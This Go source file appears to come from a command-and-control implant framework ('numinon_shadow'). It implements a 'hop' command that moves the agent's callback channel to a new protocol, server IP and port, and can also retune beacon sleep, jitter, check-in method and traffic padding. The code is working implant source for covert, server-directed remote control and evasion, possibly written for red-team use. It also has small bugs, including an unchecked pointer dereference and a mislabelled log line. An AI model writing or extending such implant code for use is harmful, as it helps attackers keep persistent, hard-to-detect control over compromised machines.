package agent

import (
	"encoding/json"
	"fmt"
	"log"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/models"
	"strings"
	"time"
)

// orchestrateHop is the orchestrator for the hop command.
func (a *Agent) orchestrateHop(task models.ServerTaskResponse) models.AgentTaskResult {

	// Create an instance of the command-specific args struct
	var args models.HopArgs

	// ServerTaskResponse.data contains the command-specific args, so now we unmarshall the field into the struct
	if err := json.Unmarshal(task.Data, &args); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal HopArgs for Task ID %s: %v. Raw Data: %s", task.TaskID, err, string(task.Data))
		log.Printf("|❗ERR HOP ORCHESTRATOR| %s", errMsg)
		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureUnmarshallError,
			Error:  errMsg,
		}
	}

	log.Printf("|🐇 HOP ORCHESTRATOR| Task ID: %s. Orchestrating Hop to New Protocol '%s' on New IP '%s'",
		task.TaskID, args.NewServerIP, args.NewServerPort)

	// AGENT-SIDE VALIDATION

	// --- Validate Core HopArgs ---
	if args.NewProtocol == "" || args.NewServerPort == "" {
		errMsg := "Missing required hop parameters (NewProtocol and NewServerPort are mandatory)."
		log.Printf("|❗ERR HOP ORCHESTRATOR| Task ID %s: %s", task.TaskID, errMsg)
		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureInvalidArgs,
			Error:  errMsg,
		}
	}

	// Validate NewProtocol is a known type
	isValidProtocol := false
	switch args.NewProtocol {
	case config.HTTP1Clear, config.HTTP1TLS, config.HTTP2TLS, config.HTTP3, config.WebsocketClear, config.WebsocketSecure:
		isValidProtocol = true
	}
	if !isValidProtocol {
		errMsg := fmt.Sprintf("Invalid or unsupported NewProtocol specified: %s", args.NewProtocol)
		log.Printf("|❗ERR HOP ORCHESTRATOR| Task ID %s: %s", task.TaskID, errMsg)
		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureInvalidArgs,
			Error:  errMsg,
		}
	}

	// --- Construct nextLoopConfig ---
	// Start with a copy of the current config to preserve unspecified settings.
	// Note: This is a shallow copy. If AgentConfig had nested structs/slices that
	// also need independent modification, a deep copy would be required.
	nextConfig := a.config
	backupConfig := a.config

	// Apply mandatory overrides
	nextConfig.Protocol = args.NewProtocol
	nextConfig.ServerPort = args.NewServerPort

	// Apply optional overrides

	if args.NewServerIP != "" { // If a new IP IS provided in HopArgs
		nextConfig.ServerIP = args.NewServerIP
		log.Printf("|⚙️ HOP ORCHESTRATOR| Using new ServerIP for hop: %s", nextConfig.ServerIP)
	} else {
		// NewServerIP was not provided or was empty in HopArgs, so retain current a.config.ServerIP
		log.Printf("|⚙️ HOP ORCHESTRATOR| NewServerIP not provided for hop, retaining current ServerIP: %s", nextConfig.ServerIP)
	}

	if args.NewCheckInEndpoint != nil {
		nextConfig.CheckInEndpoint = *args.NewCheckInEndpoint
	}
	if args.NewResultsEndpoint != nil {
		nextConfig.ResultsEndpoint = *args.NewResultsEndpoint
	}
	if args.NewWebSocketEndpoint != nil {
		nextConfig.WebsocketEndpoint = *args.NewWebSocketEndpoint
	}

	if args.NewDelay != nil {
		newSleepDur, parseErr := time.ParseDuration(*args.NewDelay)
		if parseErr == nil && newSleepDur > 0 {
			nextConfig.Delay = newSleepDur
		} else {
			log.Printf("|❗ERR HOP ORCHESTRATOR| Task ID %s: Invalid NewBaseSleep value '%s' provided, existing BaseSleep (%v) will be used for new channel.",
				task.TaskID, *args.NewDelay, nextConfig.Delay)
		}
	}

	if args.NewJitter != nil {
		if *args.NewJitter >= 0.0 && *args.NewJitter <= 1.0 {
			nextConfig.Jitter = *args.NewJitter
		} else {
			log.Printf("|❗ERR HOP ORCHESTRATOR| Task ID %s: Invalid NewJitter value '%f' provided, existing Jitter (%f) will be used for new channel.",
				task.TaskID, *args.NewJitter, nextConfig.Jitter)
		}
	}

	if *args.NewBeaconMode == false {
		nextConfig.BeaconMode = false
	} else {
		nextConfig.BeaconMode = true
	}

	if args.NewCheckinMethod != nil {
		upperMethod := strings.ToUpper(*args.NewCheckinMethod)
		if upperMethod == "GET" || upperMethod == "POST" {
			nextConfig.CheckinMethod = upperMethod
		} else {
			log.Printf("|❗ERR HOP ORCHESTRATOR| Task ID %s: Invalid NewCheckinMethod value '%s' provided, existing CheckinMethod (%s) will be used for new channel.",
				task.TaskID, *args.NewCheckinMethod, nextConfig.CheckinMethod)
		}
	}

	if args.NewEnablePadding != nil {
		nextConfig.EnablePadding = *args.NewEnablePadding
	}

	if args.NewMinPaddingBytes != nil {
		if *args.NewMinPaddingBytes >= 0 {
			nextConfig.MinPaddingBytes = *args.NewMinPaddingBytes
		} else {
			log.Printf("|❗ERR HOP ORCHESTRATOR| Task ID %s: Invalid NewMinPaddingBytes value '%d' provided, existing MinPaddingBytes (%d) will be used for new channel.",
				task.TaskID, *args.NewMinPaddingBytes, nextConfig.MinPaddingBytes)
		}
	}

	if args.NewMaxPaddingBytes != nil {
		if *args.NewMaxPaddingBytes >= 0 { // Also ensure Max >= Min if both are set
			if args.NewMinPaddingBytes != nil && *args.NewMaxPaddingBytes < *args.NewMinPaddingBytes && *args.NewMinPaddingBytes >= 0 { // if min is also being set, and max is less than it
				log.Printf("|❗ERR HOP ORCHESTRATOR| Task ID %s: NewMaxPaddingBytes '%d' is less than NewMinPaddingBytes '%d'. Using existing MaxPaddingBytes (%d).",
					task.TaskID, *args.NewMaxPaddingBytes, *args.NewMinPaddingBytes, nextConfig.MaxPaddingBytes)
			} else if *args.NewMaxPaddingBytes < nextConfig.MinPaddingBytes { // if min is NOT being set, but max is less than existing min
				log.Printf("|❗ERR HOP ORCHESTRATOR| Task ID %s: NewMaxPaddingBytes '%d' is less than current MinPaddingBytes '%d'. Using existing MaxPaddingBytes (%d).",
					task.TaskID, *args.NewMaxPaddingBytes, nextConfig.MinPaddingBytes, nextConfig.MaxPaddingBytes)
			} else {
				nextConfig.MaxPaddingBytes = *args.NewMaxPaddingBytes
			}
		} else {
			log.Printf("|❗ERR HOP ORCHESTRATOR| Task ID %s: Invalid NewMaxPaddingBytes value '%d' provided, existing MaxPaddingBytes (%d) will be used for new channel.",
				task.TaskID, *args.NewMaxPaddingBytes, nextConfig.MaxPaddingBytes)
		}
	}

	// Integrity check after all potential padding changes
	if nextConfig.MinPaddingBytes > nextConfig.MaxPaddingBytes {
		log.Printf("|❗ERR HOP ORCHESTRATOR| Task ID %s: MinPaddingBytes (%d) is greater than MaxPaddingBytes (%d) after processing HopArgs. Retaining original values.", task.TaskID, nextConfig.MinPaddingBytes, nextConfig.MaxPaddingBytes)
		nextConfig.MinPaddingBytes = backupConfig.MinPaddingBytes
		nextConfig.MaxPaddingBytes = backupConfig.MaxPaddingBytes
		nextConfig.EnablePadding = backupConfig.EnablePadding // Also reset enable if bounds are bad
	}

	log.Printf("|🐇 HOP ORCHESTRATOR| Constructed nextLoopConfig for hop: %+v", nextConfig)

	// --- Atomically Set Flags to Signal the Main Loop ---
	a.hopMutex.Lock()
	a.pendingHopConfig = &nextConfig // Store the address of our fully prepared nextConfig
	a.requestingHop = true           // loop will check this, when true, replaces config
	a.hopMutex.Unlock()

	log.Printf("|⚙️ HOP ORCHESTRATOR| Hop flags set. Pending config protocol: %s", nextConfig.Protocol) // Use nextConfig directly here for the log

	// --- Return Acknowledgement TaskResult (sent on OLD channel) ---
	successMsg := fmt.Sprintf("Agent acknowledged hop. Will attempt to transition to %s on %s:%s after this cycle.",
		nextConfig.Protocol, nextConfig.ServerIP, nextConfig.ServerPort)
	log.Printf("|⚙️ HOP ORCHESTRATOR| Sending acknowledgement: %s", successMsg)

	finalResult := models.AgentTaskResult{
		TaskID: task.TaskID,
		Status: models.StatusSuccessHopInitiated,
	}

	// Add this right after creating finalResult:
	outputJSON, _ := json.Marshal([]byte(successMsg))
	finalResult.Output = outputJSON

	return finalResult

}
